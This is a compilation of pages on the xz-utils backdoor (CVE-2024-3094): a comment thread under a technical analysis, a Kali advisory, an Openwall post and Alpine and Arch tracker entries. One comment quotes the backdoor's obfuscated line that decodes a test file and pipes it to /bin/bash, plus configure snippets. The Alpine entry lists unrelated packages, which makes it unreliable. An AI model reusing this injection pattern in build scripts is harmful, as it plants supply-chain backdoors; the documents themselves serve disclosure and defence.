{The mailing list entry about "[PATCH] LZMA\_FINISH will now trigger LZMA\_BUF\_ERROR on truncated xz files right away" is maybe related to "In the last step of this stage the fixed xz byte stream is extracted with errors being ignored (the stream seems to be truncated, but that doesn't matter as the whole meaningful output has already been written out).".

Lasse declined that patch in the reply though, as needlessly complex and partly incorrect.}

2024-04-02 09:08:20 = [Phant](http://)
{I think `sed \"r\n\" $gl\_am\_configmake` is not as benign as it seems: adding a newline after the last line is only its side effect. It actually appends the content read from the file `\n` (which \*\*currently\*\* does not exist) after each line of the input. I could not find this idiom used anywhere in Gnulib or elsewhere (the normal way to normalize a file to contain a newline at the end with sed seems to be `sed '$a\'`, see <https://stackoverflow.com/a/16198793>), so might have been intentional for further exploitation.}

2024-04-02 10:41:38 = [WhiteLightning](http://)
{This twit summarizes how it was introduced very nicely: https://twitter.com/fr0gger\_/status/1774342248437813525}

2024-04-02 10:44:39 = [SielaQ](http://)
{> how many things still remain undiscovered.

Even more scary are compliers
if once backdoor would have been introduced there, years ago, unnoticed (like git push -f to hide)
 it could stay forever - self replicating.

Would be also interesting to get the info from github, if they have full history, what has been already hidden by push -f in the xz repo. I wonder if they are able to keep/store every "lost" commits. In such low contributed repo it could be unnoticed by other contributors.}

2024-04-02 11:02:39 = [Gynvael Coldwind](.)
{@SielaQ
Ah, the good ol' Reflections on Trusting Trust :)}

2024-04-02 16:23:39 = [Jia Tan](http://)
{Too bad they found it...}

2024-04-02 20:14:54 = [Alexxx](http://)
{In stage 2 the file called "injected.txt" by Andres, not "infected.txt".}

2024-04-02 20:43:12 = [chongalicious](http://)
{Some minor corrections to commenters above:

1. GNU AWK does in fact support XOR; although portability may have been the driving concern for the author in using modular arithmetic.
2. Even though addition is equivalent to XOR over GF(2); it is invalid for any GF(256) which is what the author was attempting to do with the modulus operator.}

2024-04-02 20:43:13 = [chongalicious](http://)
{Some minor corrections to commenters above:

1. GNU AWK does in fact support XOR; although portability may have been the driving concern for the author in using modular arithmetic.
2. Even though addition is equivalent to XOR over GF(2); it is invalid for any GF(256) which is what the author was attempting to do with the modulus operator.}

2024-04-03 22:33:19 = [cez](http://)
{But wouldn't the attacker require the external/public IP of the targets and ssh port opened in wild in order to perform the attack?
How many critical servers do expose standard port 22 on internet? Isn't very easy to track which source IPs are allowed to connect to an SSH server? (Unless attacket spoofs source IP to mach a legitimate one)
But even then is easy to check all source IPs which connect to ssh.
}

2024-04-05 03:21:04 = [GerHobbelt](http://)
{@cez: not a problem. And the thing is not bound to port 22, it's bound to SSHd, which can be elsewhere in the port range. Anyway. Once you have this going, you hand a little toolkit (a parallel development, I'm sure) with the right Ed448, etc. built-in, to others for the task of server discovery, no need for your skills there. Give it to a bunch of "affiliate" spammers who are well-versed in portscanning by way of a botnet already. From the victims' perspective nothing out of the ordinary every day, just the regular noisy door-ringing by the internet vandals happening on your server hardware; the wicked bit is that one attempt that makes it through, so to keep that one silent will perhaps need some extra magic in your fast\_crc64.o object file. ;-) Though I'm given to understand this is an RCE approach (https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b) so usual access monitoring might very well not catch that one criminal out of many doing something right with your (compromised) machine.

Keep in mind that this is clearly somebody/ies who don't suffer from corporate next-quarter syndrome nor the limited attention span of a lot of hackers: here's this nice keyed kit for you, send me (or rather: my boss, do not bother me with the trivial stuff) a list of 'discovered' servers every week and keep it going, with some random pauses, for the next year. Here's a list of IP ranges (owned by company/government X, Y and Z) we're particularly interested in, and do it all quiet like; do NOT get cocky, ya hear! Cheerio!

"easy to check all source IPs which connect to ssh". bye bye. Your attacker is hiding in the loud internet noise. They're not planning to attain Internet Armageddon by next week.

Back OT: thanks for publishing and the analysis effort, not just here. Frickin' awesome to see it happening. Most CVE's don't get published (tech analysis, etc.) at this level, which is a real pity.

And messieurs "Jia Tan", "Hans Jansen", et al are having a very bad week. Well, there's always wodka and then... on to the next crafty idea. Damn, this is some /really/ smart work from their side. :-))) Think about it: we read the post-mortem analysis in a few hours, /they/ had to come up with all this shit and make sure it worked on (almost) all systems: that's some /serious/ dev + test effort!
Obfuscation code like that doesn't get written in a day. Or a week.

Next thing: I'm very curious what the fallout of all this is going to be long(er) term; I'm a couple days late to the party and already collective stupidity is mounting in the youtube ocean and spilling over; while the original goal may have been thwarted, their benefit long-term is a (my estimate) significant drop in mutual trust in FOSS circles and their consumers/freeloaders, slowing everybody down, or even better, scared chickens reverting to exclusively using vetted closed-source in the trust chain. And all this politically right on time for the new EU CRA+PLA laws under development, jolly good! I can already see the OGs smile with glee for they know exactly how to handle that scenario; the usual suspects have been top of class in that department since before the Manhattan Project; so nice to be back treading well-known ground. The scare will be so very useful (to them).

Keep publishing.

}

2024-04-07 02:14:54 = [Rastagraffix](http://)
{What's being missed here is that the core of this attack lies in the GNU autoconf tools. They have grown to such an absurd level of complexity that their output is simply unreadable by mortal humans. I defy you to look at any non-trivial auto\* generated Makefile and actually understand it.

This event should be the trigger that leads us to driving a stake through the heart of the zombie that autoconf and its ilk have become. The problem they were designed to address hasn't existed since the turn of the century. And as others have mentioned - time and again - a great many of the compatibility tests autoconf performs are for systems that are no longer in existence, and would be incapable of running today's autoconf even if they were.

The sorts of OS-release-specific customization required on modern systems can be handled by short, \*simple\*, shell scripts. People just need to (re-)learn how to write portable Makefiles (and code). I know it's possible, because I never stopped doing it.}

2024-04-08 05:37:49 = [spinnylights](https://milky.flowers)
{I feel a bit sheepish posting this comment on a very interesting and detailed technical writeup like this, but after reading the prior comments and similar comments elsewhere I really feel the urge to say: the underlying cause for this attack is social, not technical, and I think it's a waste of our time and energy regarding this to look for various technical things we don't like that we might be tempted to blame. It really wasn't the Autotools, or systemd, or IPv4, or OpenSSL, or the design of XZ Utils overall, or any other tool or library. I understand the temptation, I have my programmers' pet peeves too, but there are really serious \_sociocultural\_ problems this attack points to and it will be sad to me if nothing changes in that regard. When vital free software projects used on millions of servers are run by overworked lone maintainers in their free time and they barely get any help, appreciation, pay, etc. etc., it creates the possibility for things like this to happen, and \_there is no technical solution to that\_. You can see just from this writeup alone that the person or people who conducted this attack are witty, skilled, and patient; they could certainly find other ways to slip backdoors into things given the opportunity, even we completely abandoned all of the tools/libraries/protocols/w/e that people want to point their fingers at. To me, the real solution to this is for people to help out more with the free software projects everyone depends on, whatever we might see as their technical shortcomings, whether it be by submitting useful patches, or donating to the maintainer(s), or even just by letting them know that their work is valuable and appreciated.

I agree with @GerHobbelt that this attack has the potential to do a lot of harm to the free software community, also. Having everyone be suspicious of each other might make it a little harder for attacks like this to happen, but probably it will cause more harm than it does good, because we need to be able to trust and work with each other for these projects to stay alive. I kind of doubt that was part of the motivation of the attacker(s)—it seems a lot more likely to me that they just didn't care, which is really sad—but regardless, I think it's important that we stick by each other as free software developers and try to find more time to help and support each other.}

2024-04-08 21:38:58 = [Rastagraffix](http://)
{I'm concerned about topic drift, so I'll try to be brief ... But I would argue autotools is a big part of the social aspect of this, even if it is an indirect and inadvertent contributor.

autotools and the like have conditioned us to accept absurd and unnecessary levels of complexity where it is not needed. Part of the reason this attack worked is because the blizzard of noise emitted from the reams of m4 macros hid the shenanigans used to inject the attack.

A simple, human readable and \*understandable\* configuration system would have made this monkeying around much more obvious, and would likely have precluded this specific attack in the first place. }

2024-04-11 13:33:44 = [klxcrs](http://)
{Hey, hello! First of all, for me, a complete newb to this kind of sec research, this post was like an oasis, really well explained, thank you very much. There's something I've been wondering:

In Andres' mail it says that this line is added to the top Makefile:

sed rpath ../../../tests/files/bad-3-corrupt\_lzma2.xz | tr " \-\_" " \_\-" | xz -d | /bin/bash >/dev/null 2>&1;

The result of that leaving out the /bin/bash IS stage 1, correct?

That executes stage 1, which in turn executes stage 2. Stage 2 IS in charge of making the modifications to the Makefile. But to get to this point the Makefile had to be modified already... no?

I've been reading by myself and I thought the resulting patched Makefile was a result of running ./configure which runs ./config.status which at the same time has malicious instructions from the M4sh macros that are used to create it. Specifically this one:

if test "x$gl\_am\_configmake" != "x"; then
 gl\_localedir\_config='sed \"r\n\" $gl\_am\_configmake | eval $gl\_path\_map | $gl\_localedir\_prefix -d 2>/dev/null'
#[...] (this is a snippet from the ./configure script)

With $gl\_path\_map = 'tr "\t \-\_" " \t\_\-"' \*\*\* $gl\_localedir\_prefix = xz \*\*\* and $gl\_am\_configmake being the corrupted ####Hello#### string before the restoration transformation that the 'tr' commands performs. So this is ALSO stage 1 only that this time it will be executed in the context of ./configure and not the Makefile) here:

#[...]
 eval $gl\_config\_gt | $SHELL 2>/dev/null ;;
[...]

Having gl\_config\_gt="eval \$gl\_localedir\_config"

So ./configure->stage1->stage2->malicious Makefile generated.
But Makefile->stage1->stage2->Malicious Makefile that I just executed patched again????? wha

I guess it's something really stupid that I don't see. All this because I don't know anything about autotools lol.

}

2024-04-25 04:08:43 = [cktse](http://)
{Thanks for sharing your excellent detailed analysis.}
## Add a comment:

| Nick: |  |
| --- | --- |
| URL (optional): |  |
| Math captcha: 9 ∗ 6 ＋ 5 = |  |
|  | |



=== Content from www.kali.org_b7228b82_20250111_034042.html ===


* [Get Kali](https://www.kali.org/get-kali/)
* [Blog](https://www.kali.org/blog/)
* Documentation [Documentation Pages](https://www.kali.org/docs/)
  [Tools Documentation](https://www.kali.org/tools/)
  [Frequently Asked Questions](https://www.kali.org/faq/)
  [Known Issues](https://bugs.kali.org/search.php?project_id=1&category_id[]=General%20Bug&category_id[]=Kali%20Package%20Bug&category_id[]=Kali%20Package%20Improvement&status[]=30&status[]=40&status[]=50&sticky=on&sort=id%2Clast_updated&dir=DESC%2CDESC&hide_status=-2&match_type=0)
* Community [Community Support](https://www.kali.org/community/)
  [Forums](https://forums.kali.org/)
  [Discord](https://discord.kali.org/)
  [Join Newsletter](https://www.kali.org/newsletter/)
  [Mirror Location](https://http.kali.org/README?mirrorlist)
  [Get Involved](https://www.kali.org/docs/community/contribute/)
* Courses [Kali Linux Revealed (KLCP/PEN-103)](https://www.offsec.com/courses/pen-103/)
  [PEN-200 (PWK/OSCP)](https://www.offsec.com/courses/pen-200/)
  [PEN-210 (WiFu/OSWP)](https://www.offsec.com/courses/pen-210/)
  [PEN-300 (ETBD/OSEP)](https://www.offsec.com/courses/pen-300/)
  [WEB-200 (WAWK/OSWA)](https://www.offsec.com/courses/web-200/)
  [WEB-300 (AWAE/OSWE)](https://www.offsec.com/courses/web-300/)
  [EXP-301 (WUMED/OSED)](https://www.offsec.com/courses/exp-301/)
  [EXP-312 (MCB/OSMR)](https://www.offsec.com/courses/exp-312/)
  [EXP-401 (AWE/OSEE)](https://www.offsec.com/courses/exp-401/)
  [SOC-200 (OSDA)](https://www.offsec.com/courses/soc-200/)
* Developers [Git Repositories](https://gitlab.com/kalilinux)
  [Packages](https://pkg.kali.org/)
  [Auto Package Test](https://autopkgtest.kali.org/)
  [Bug Tracker](https://bugs.kali.org/)
  [Kali NetHunter Stats](https://nethunter.kali.org/)
* About [Kali Linux Overview](https://www.kali.org/features/)
  [Press Pack](https://gitlab.com/kalilinux/documentation/press-pack/-/archive/main/press-pack-main.zip)
  [Kali Swag Store](https://offsec.usa.dowlis.com/kali/view-all.html)
  [Meet The Kali Team](https://www.kali.org/about-us/)
  [Partnerships](https://www.kali.org/partnerships/)
  [Contact Us](https://www.kali.org/contact/)

LIGHT
DARK![](https://www.kali.org/blog/about-the-xz-backdoor/images/xz-utils.jpg)
Friday, 29 March 2024
# All about the xz-utils backdoor

As of 5:00 pm ET on March 29, 2024 the following information is accurate. Should there be updates to this situation, they will be edited onto this blog post.

The [xz-utils package](https://pkg.kali.org/pkg/xz-utils), starting from versions 5.6.0 to 5.6.1, was found to [contain a backdoor (CVE-2024-3094)](https://nvd.nist.gov/vuln/detail/CVE-2024-3094). This backdoor could potentially allow a malicious actor to compromise sshd authentication, granting unauthorized access to the entire system remotely.

With a library this widely used, the severity of this vulnerability poses a threat to the entire Linux ecosystem. Luckily, this issue was caught quickly so the impact was significantly less than it could have been. It has already been patched in Debian, and therefore, Kali Linux.

The impact of this vulnerability affected Kali between March 26th to March 29th, during which time [xz-utils 5.6.0-0.2](https://pkg.kali.org/news/578094/xz-utils-560-02-imported-into-kali-rolling/) was available. If you updated your Kali installation on or after March 26th, but before March 29th, it is crucial to apply the latest updates today to address this issue. However, if you did not update your Kali installation before the 26th, you are not affected by this backdoor vulnerability.

[![](images/pkg-kali-xz-utils.png)](https://www.kali.org/blog/about-the-xz-backdoor/images/pkg-kali-xz-utils.png)

Should you wish to check if you have the vulnerable version installed, we can perform the following command:

```
kali@kali:~$ apt-cache policy liblzma5
liblzma5:
 Installed: 5.4.5-0.3
 Candidate: 5.6.1+really5.4.5-1
 Version table:
    5.6.1+really5.4.5-1 500
       500 http://kali.download/kali kali-rolling/main amd64 Packages
*** 5.4.5-0.3 100
       100 /var/lib/dpkg/status

```

If we see the version `5.6.0-0.2` next to **Installed:** then we *must* upgrade to the latest version, `5.6.1+really5.4.5-1`. We can do this with the following commands:

```
kali@kali:~$ sudo apt update && sudo apt install -y --only-upgrade liblzma5
...
kali@kali:~$

```

More information can be found at [Help Net Security](https://www.helpnetsecurity.com/2024/03/29/cve-2024-3094-linux-backdoor/) for a summarized post on the details of the vulnerability, [Openwall](https://www.openwall.com/lists/oss-security/2024/03/29/4) for the initial disclosure, and [NIST’s NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-3094) entry for this vulnerability.

LIGHT
DARK
#### Links

[Home](https://www.kali.org/)
[Download / Get Kali](https://www.kali.org/get-kali/)
[Blog](https://www.kali.org/blog/)
[OS Documentation](https://www.kali.org/docs/)
[Tool Documentation](https://www.kali.org/tools/)
[System Status](https://status.kali.org/)
[Archived Releases](https://old.kali.org/)
#### Platforms

[ARM (SBC)](https://arm.kali.org/)
[NetHunter (Mobile)](https://nethunter.kali.org/)
[Amazon AWS](https://aws.amazon.com/marketplace/pp/B08LL91KKB "Amazon AWS")[Docker](https://hub.docker.com/u/kalilinux "Docker")[Linode](https://www.linode.com/marketplace/apps/kali-linux/kali-linux/ "Linode")[Microsoft Azure](https://azuremarketplace.microsoft.com/en/marketplace/apps/kali-linux.kali "Microsoft Azure")[Microsoft Store (WSL)](https://www.microsoft.com/en-us/p/kali-linux/9pkr34tncv07 "Microsoft Store")[Vagrant](https://app.vagrantup.com/kalilinux "Vagrant")
#### Development

[Bug Tracker](https://bugs.kali.org/)
[Continuous Integration](https://autopkgtest.kali.org/)
[Network Mirror](https://http.kali.org/README?mirrorlist)
[Package Tracker](https://pkg.kali.org/)
[GitLab](https://gitlab.com/kalilinux "GitLab")
#### Community

[Discord](https://discord.kali.org/ "Discord")[Support Forum](https://forums.kali.org/)
#### Follow Us

[Facebook](https://www.facebook.com/kalilinux "Facebook")[Instagram](https://www.instagram.com/kalilinux/ "Instagram")[Mastodon](https://infosec.exchange/%40kalilinux "Mastodon")[Twitter](https://twitter.com/kalilinux "Twitter")
[Newsletter](https://www.kali.org/newsletter/ "Newsletter")[RSS](https://www.kali.org/rss.xml "RSS")
#### Policies

[Cookie Policy](https://www.kali.org/docs/policy/cookie/)
[Privacy Policy](https://www.kali.org/docs/policy/privacy/)
[Trademark Policy](https://www.kali.org/docs/policy/trademark/)
© OffSec Services Limited 2025. All rights reserved.

=== Content from www.openwall.com_c3c12f38_20250111_034002.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](26) [[next>]](28) [[<thread-prev]](26) [[thread-next>]](28) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240330162459.GA10648@openwall.com>
Date: Sat, 30 Mar 2024 17:24:59 +0100
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Re: backdoor in upstream xz/liblzma leading to ssh server compromise

On Sat, Mar 30, 2024 at 11:32:54AM -0400, Jeffrey Walton wrote:
> Lasse published a statement at <<https://tukaani.org/xz-backdoor/>>.

Quoting here for archival, and ease and safety of access:

---
XZ Utils backdoor
Lasse Collin

This page is short for now but it will get updated as I learn more about the incident. Most likely it will be during the first week of April 2024.

The Git repositories of XZ projects are on git.tukaani.org.

xz.tukaani.org DNS name (CNAME) has been removed. The XZ projects currently don't have a home page. This will be fixed in a few days.

Facts

- CVE-2024-3094

- XZ Utils 5.6.0 and 5.6.1 release tarballs contain a backdoor. These tarballs were created and signed by Jia Tan.

- Tarballs created by Jia Tan were signed by him. Any tarballs signed by me were created by me.

- GitHub accounts of both me (Larhzu) and Jia Tan are suspended.

- xz.tukaani.org (DNS CNAME) was hosted on GitHub pages and thus is down too. It might be moved to back to the main tukaani.org domain in the near future.

- Only I have had access to the main tukaani.org website, git.tukaani.org repositories, and related files. Jia Tan only had access to things hosted on GitHub, including xz.tukaani.org subdomain (and only that subdomain).

Links

- Details by Andres Freund
<https://www.openwall.com/lists/oss-security/2024/03/29/4>

- FAQ by thesamesam
<https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27>

- Gentoo bug 928134
<https://bugs.gentoo.org/928134>

- Debian bug 1068024
<https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068024>
---

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from security.alpinelinux.org_9a2a6333_20250111_034036.html ===

[![Alpine Linux](/static/alpinelinux-logo.svg)](/)
# CVE-2024-3094

Name
CVE-2024-3094

Description
Malicious code was discovered in the upstream tarballs of xz, starting with version 5.6.0.
Through a series of complex obfuscations, the liblzma build process extracts a prebuilt object file from a disguised test file existing in the source code, which is then used to modify specific functions in the liblzma code. This results in a modified liblzma library that can be used by any software linked against this library, intercepting and modifying the data interaction with this library.

NVD Severity
unknown

Other trackers
[CVE](https://cve.mitre.org/cve/cvename.cgi?name=CVE-2024-3094),
[NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-3094),
[CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2024-3094),
[CVE Details](https://www.cvedetails.com/cve-details.php?cve_id=CVE-2024-3094),
[CIRCL](https://cve.circl.lu/cve/CVE-2024-3094),
[Arch Linux](https://security.archlinux.org/CVE-2024-3094),
[Debian](https://security-tracker.debian.org/tracker/CVE-2024-3094),
[Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2024-3094),
[Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2024-3094),
[Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2024-3094),
[SUSE (Bugzilla)](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2024-3094),
[SUSE (CVE)](https://www.suse.com/security/cve/CVE-2024-3094/),
[Mageia](https://advisories.mageia.org/CVE-2024-3094.html)

Mailing lists
[oss-security](https://marc.info/?l=oss-security&s=CVE-2024-3094),
[full-disclosure](https://marc.info/?l=full-disclosure&s=CVE-2024-3094),
[bugtraq](https://marc.info/?l=bugtraq&s=CVE-2024-3094)

Exploits
[Exploit DB](https://www.exploit-db.com/search/?action=search&cve=CVE-2024-3094),
[Metasploit](https://www.rapid7.com/db/search?q=CVE-2024-3094)

Forges
GitHub ([code](https://github.com/search?type=Code&q="CVE-2024-3094"),
[issues](https://github.com/search?type=Issues&q="CVE-2024-3094")),
Aports ([code](https://gitlab.alpinelinux.org/search?group_id=2&project_id=1&scope=blobs&search=CVE-2024-3094),
[issues](https://gitlab.alpinelinux.org/alpine/aports/-/issues?state=all&search=CVE-2024-3094))

## References

| Type | URI |
| --- | --- |
| vdb-entry | <https://access.redhat.com/security/cve/CVE-2024-3094> |
| issue-tracking | <https://bugzilla.redhat.com/show_bug.cgi?id=2272210> |
| secalert@redhat.com | <https://www.openwall.com/lists/oss-security/2024/03/29/4> |
| secalert@redhat.com | <https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users> |
| secalert@redhat.com | <https://arstechnica.com/security/2024/03/backdoor-found-in-widely-used-linux-utility-breaks-encrypted-ssh-connections/> |
| secalert@redhat.com | <https://aws.amazon.com/security/security-bulletins/AWS-2024-002/> |
| secalert@redhat.com | <https://bugzilla.suse.com/show_bug.cgi?id=1222124> |
| secalert@redhat.com | <https://news.ycombinator.com/item?id=39865810> |
| secalert@redhat.com | <https://openssf.org/blog/2024/03/30/xz-backdoor-cve-2024-3094/> |
| secalert@redhat.com | <https://security-tracker.debian.org/tracker/CVE-2024-3094> |
| secalert@redhat.com | <https://security.alpinelinux.org/vuln/CVE-2024-3094> |
| secalert@redhat.com | <https://security.archlinux.org/CVE-2024-3094> |
| secalert@redhat.com | <https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094> |
| secalert@redhat.com | <https://www.darkreading.com/vulnerabilities-threats/are-you-affected-by-the-backdoor-in-xz-utils> |
| secalert@redhat.com | <https://www.tenable.com/blog/frequently-asked-questions-cve-2024-3094-supply-chain-backdoor-in-xz-utils> |
| secalert@redhat.com | <https://www.theregister.com/2024/03/29/malicious_backdoor_xz/> |
| secalert@redhat.com | <https://lists.freebsd.org/archives/freebsd-security/2024-March/000248.html> |
| secalert@redhat.com | <https://gynvael.coldwind.pl/?lang=en&id=782> |
| secalert@redhat.com | <https://news.ycombinator.com/item?id=39877267> |
| secalert@redhat.com | <https://boehs.org/node/everything-i-know-about-the-xz-backdoor> |
| secalert@redhat.com | <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068024> |
| secalert@redhat.com | <https://bugs.gentoo.org/928134> |
| secalert@redhat.com | <https://discourse.nixos.org/t/cve-2024-3094-malicious-code-in-xz-5-6-0-and-5-6-1-tarballs/42405> |
| secalert@redhat.com | <https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27> |
| secalert@redhat.com | <https://github.com/advisories/GHSA-rxwq-x6h5-x525> |
| secalert@redhat.com | <https://github.com/karcherm/xz-malware> |
| secalert@redhat.com | <https://lists.debian.org/debian-security-announce/2024/msg00057.html> |
| secalert@redhat.com | <https://lwn.net/Articles/967180/> |
| secalert@redhat.com | <https://tukaani.org/xz-backdoor/> |
| secalert@redhat.com | <https://twitter.com/debian/status/1774219194638409898> |
| secalert@redhat.com | <https://twitter.com/infosecb/status/1774595540233167206> |
| secalert@redhat.com | <https://twitter.com/infosecb/status/1774597228864139400> |
| secalert@redhat.com | <https://ubuntu.com/security/CVE-2024-3094> |
| secalert@redhat.com | <https://xeiaso.net/notes/2024/xz-vuln/> |
| Third Party Advisory | <https://twitter.com/LetsDefendIO/status/1774804387417751958> |
| secalert@redhat.com | <https://github.com/amlweems/xzbot> |
| secalert@redhat.com | <https://news.ycombinator.com/item?id=39895344> |
| secalert@redhat.com | <https://www.vicarius.io/vsociety/vulnerabilities/cve-2024-3094> |
| secalert@redhat.com | <https://security.netapp.com/advisory/ntap-20240402-0001/> |
| secalert@redhat.com | <https://www.kali.org/blog/about-the-xz-backdoor/> |
| secalert@redhat.com | <https://ariadne.space/2024/04/02/the-xz-utils-backdoor-is-a-symptom-of-a-larger-problem/> |
| secalert@redhat.com | <https://research.swtch.com/xz-script> |
| secalert@redhat.com | <https://research.swtch.com/xz-timeline> |
| secalert@redhat.com | <https://blog.netbsd.org/tnf/entry/statement_on_backdoor_in_xz> |
| secalert@redhat.com | <http://www.openwall.com/lists/oss-security/2024/03/30/12> |
| secalert@redhat.com | <http://www.openwall.com/lists/oss-security/2024/03/29/10> |
| secalert@redhat.com | <http://www.openwall.com/lists/oss-security/2024/03/29/4> |
| secalert@redhat.com | <http://www.openwall.com/lists/oss-security/2024/03/29/5> |
| secalert@redhat.com | <http://www.openwall.com/lists/oss-security/2024/03/29/8> |
| secalert@redhat.com | <http://www.openwall.com/lists/oss-security/2024/03/30/27> |
| secalert@redhat.com | <http://www.openwall.com/lists/oss-security/2024/03/30/36> |
| secalert@redhat.com | <http://www.openwall.com/lists/oss-security/2024/03/30/5> |
| secalert@redhat.com | <http://www.openwall.com/lists/oss-security/2024/03/29/12> |
| secalert@redhat.com | <http://www.openwall.com/lists/oss-security/2024/04/16/5> |

## Match rules

| CPE URI | Source package | Min version | Max version |
| --- | --- | --- | --- |
|  | shopxo | == 5.6.0 | == 5.6.0 |
|  | shopxo | == 5.6.1 | == 5.6.1 |

## Vulnerable and fixed packages

| Source package | Branch | Version | Maintainer | Status |
| --- | --- | --- | --- | --- |
| [lighttpd](/srcpkg/lighttpd) | [3.16-main](/branch/3.16-main) | 1.4.76-r0 | Natanael Copa <ncopa@alpinelinux.org> | fixed |
| [lighttpd](/srcpkg/lighttpd) | [3.18-main](/branch/3.18-main) | 1.4.76-r0 | Natanael Copa <ncopa@alpinelinux.org> | fixed |
| [lighttpd](/srcpkg/lighttpd) | [3.17-main](/branch/3.17-main) | 1.4.76-r0 | Natanael Copa <ncopa@alpinelinux.org> | fixed |

secfixes-tracker 0.6.0 —
[Source code](https://gitlab.alpinelinux.org/alpine/security/secfixes-tracker)



=== Content from security.archlinux.org_4cf2fb34_20250111_034037.html ===

[Arch Linux](https://archlinux.org "Return to the main page")

* [Home](https://archlinux.org "Arch news, packages, projects and more")
* [Packages](https://archlinux.org/packages/ "Arch Package Database")
* [Forums](https://bbs.archlinux.org/ "Community forums")
* [Wiki](https://wiki.archlinux.org/ "Community documentation")
* [GitLab](https://gitlab.archlinux.org/ "GitLab")
* [Security](https://security.archlinux.org/ "Arch Linux Security Tracker")
* [AUR](https://aur.archlinux.org/ "Arch Linux User Repository")
* [Download](https://archlinux.org/download/ "Get Arch Linux")

* [issues](/)
* [advisories](/advisory)
* [todo](/todo)
* [stats](/stats)
* [log](/log)
* [login](/login)

---

# CVE-2024-3094 [log](/CVE-2024-3094/log)

| Source | * CVE   + [Red Hat](https://access.redhat.com/security/cve/CVE-2024-3094)   + [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3094)   + [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-3094)   + [Debian](https://security-tracker.debian.org/tracker/CVE-2024-3094)   + [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2024-3094)   + [SUSE](https://www.suse.com/security/cve/CVE-2024-3094)   + [Alpine](https://security.alpinelinux.org/vuln/CVE-2024-3094)   + [Mageia](https://advisories.mageia.org/CVE-2024-3094.html)   + [CVE Details](https://www.cvedetails.com/cve-details.php?cve_id=CVE-2024-3094)   + [CIRCL](https://cve.circl.lu/cve/CVE-2024-3094) * Bugs   + [Arch Linux](https://bugs.archlinux.org/?project=0&order=id&status%5B%5D=&sort=desc&search_in_details=1&string=CVE-2024-3094)   + [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2024-3094)   + [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2024-3094)   + [SUSE](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2024-3094)   + [GitHub](https://github.com/search?type=Issues&q=%22CVE-2024-3094%22) * Lists   + [oss-security](https://marc.info/?l=oss-security&s=CVE-2024-3094)   + [full-disclosure](https://marc.info/?l=full-disclosure&s=CVE-2024-3094)   + [bugtraq](https://marc.info/?l=bugtraq&s=CVE-2024-3094) * Misc   + [GitHub code](https://github.com/search?type=Code&q=%22CVE-2024-3094%22)   + [web search](https://www.google.net/search?gws_rd=cr&q=%22CVE-2024-3094%22) |
| --- | --- |
| Severity | Critical |
| Remote | Yes |
| Type | Authentication bypass |
| Description | ``` Malicious code was discovered in the upstream tarballs of xz, starting with version 5.6.0. The tarballs included extra .m4 files, which contained instructions for building with automake that did not exist in the repository. These instructions, through a series of complex obfuscations, extract a prebuilt object file from one of the test archives, which is then used to modify specific functions in the code while building the liblzma package. This issue results in liblzma being used by additional software, like sshd, to provide functionality that will be interpreted by the modified functions. ``` |

| Group | Package | Affected | Fixed | Severity | Status | Ticket |
| --- | --- | --- | --- | --- | --- | --- |
